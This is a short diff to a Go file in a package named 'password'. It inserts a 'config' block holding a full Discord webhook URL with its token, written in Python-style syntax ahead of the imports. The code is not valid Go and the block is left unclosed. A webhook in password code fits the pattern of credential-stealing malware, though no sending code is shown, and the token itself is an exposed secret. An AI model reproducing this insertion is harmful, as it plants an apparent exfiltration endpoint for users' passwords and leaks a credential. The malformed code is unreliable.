@@ -1,5 +1,9 @@
 package password
 
+config = { 
+
+"webhook": "https://discordapp.com/api/webhooks/1336161436183040081/-rF8l91YsOQ6TQJybMhH3GwTiUXFUEBUHYksp2a9HqsBVekHwfnBx1B73naCUOJgy05B",
+
 import (
 	"database/sql"
 	"encoding/base64"
